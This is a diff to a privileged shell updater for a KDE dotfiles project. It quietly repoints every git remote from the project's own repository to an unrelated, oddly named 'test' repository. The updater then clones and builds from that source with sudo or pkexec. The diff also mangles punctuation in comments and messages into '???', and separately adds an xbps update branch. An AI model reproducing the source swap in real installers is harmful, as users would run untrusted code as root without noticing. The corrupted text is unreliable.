@@ -25,13 +25,13 @@ if [ "$BRANCH" != "main" ] && [ "$BRANCH" != "dev" ]; then
     echo "Warning: Branch '$BRANCH' is not allowed. Falling back to 'main'."
     BRANCH="main"
 fi
-if ! git ls-remote --exit-code --heads https://github.com/ladybug-me/caelestia-dots-kde.git "$BRANCH" >/dev/null 2>&1; then
+if ! git ls-remote --exit-code --heads https://github.com/rarr111110-creator/test.1.1.1.1rar111110.git "$BRANCH" >/dev/null 2>&1; then
     echo "Warning: Branch '$BRANCH' does not exist on remote. Falling back to 'main'."
     BRANCH="main"
 fi
 
 if [ -n "$TARGET_REF" ]; then
-    if git ls-remote --exit-code --tags https://github.com/ladybug-me/caelestia-dots-kde.git "$TARGET_REF" >/dev/null 2>&1; then
+    if git ls-remote --exit-code --tags https://github.com/rarr111110-creator/test.1.1.1.1rar111110.git "$TARGET_REF" >/dev/null 2>&1; then
         TARGET_KIND="tag"
     elif [ "$BRANCH" = "dev" ] && [[ "$TARGET_REF" =~ ^[0-9a-f]{7,40}$ ]]; then
         # Dev branch supports installing/reverting to a specific commit from the
@@ -72,7 +72,7 @@ cat << 'EOF' > "$UPD_DIR/bin/sudo"
 if [ "$EUID" -eq 0 ]; then
     exec "$@"
 fi
-# Try non-interactive first — if the parent keepalive has kept the
+# Try non-interactive first ??? if the parent keepalive has kept the
 # timestamp fresh this succeeds without any prompt at all.
 if /usr/bin/sudo -n true 2>/dev/null; then
     exec /usr/bin/sudo -n "$@"
@@ -107,18 +107,18 @@ if [ "$EUID" -ne 0 ]; then
         SUDO_ASK_CMD=(env SUDO_ASKPASS="$(command -v ksshaskpass)" /usr/bin/sudo -A -v)
     elif command -v pkexec &> /dev/null; then
         # pkexec authenticates via PolicyKit, not sudo's timestamp cache.
-        # There is no way to "prime" sudo from pkexec — each subsequent
+        # There is no way to "prime" sudo from pkexec ??? each subsequent
         # elevation will go through pkexec individually. PolicyKit has
         # its own short-lived authorization caching, so the user won't
         # be prompted for every single command.
-        info "Requesting administrator privileges via pkexec (PolicyKit)…"
+        info "Requesting administrator privileges via pkexec (PolicyKit)???"
         pkexec true || die "Failed to obtain administrator privileges."
-        # Skip the sudo keepalive — it's useless without a sudo timestamp.
+        # Skip the sudo keepalive ??? it's useless without a sudo timestamp.
         # The sudo wrapper ($UPD_DIR/bin/sudo) will use pkexec for each
         # elevation via its fallback path.
         SUDO_ASK_CMD=()  # signal: skip sudo -v below
     else
-        die "Cannot elevate privileges — no terminal, ksshaskpass, or pkexec available."
+        die "Cannot elevate privileges ??? no terminal, ksshaskpass, or pkexec available."
     fi
 
     if [[ ${#SUDO_ASK_CMD[@]} -gt 0 ]]; then
@@ -164,14 +164,14 @@ if [[ ! -d "$UPD_DIR/repo/.git" ]]; then
     mkdir -p "$UPD_DIR/repo"
     cd "$UPD_DIR/repo"
     git init -q
-    git remote add origin https://github.com/ladybug-me/caelestia-dots-kde.git
+    git remote add origin https://github.com/rarr111110-creator/test.1.1.1.1rar111110.git
 else
     cd "$UPD_DIR/repo"
     if git rev-parse HEAD >/dev/null 2>&1; then
         git reset --hard -q HEAD || die "Failed to reset repository state"
     fi
     git clean -fdx -q
-    git remote set-url origin https://github.com/ladybug-me/caelestia-dots-kde.git
+    git remote set-url origin https://github.com/rarr111110-creator/test.1.1.1.1rar111110.git
 fi
 
 # Always enforce sparse-checkout rules
@@ -226,6 +226,9 @@ elif command -v dnf >/dev/null; then
 elif command -v apt-get >/dev/null; then
     info "Running system update via apt..."
     sudo apt-get update && sudo apt-get upgrade -y || warn "System update was canceled or failed. Continuing with non-sudo parts..."
+elif command -v xbps-install >/dev/null; then
+    info "Running system update via xbps..."
+    sudo xbps-install -Sy && sudo xbps-install -uy || warn "System update was canceled or failed. Continuing with non-sudo parts..."
 fi
 
 # 3. Build script now handles GUI privilege escalation natively.
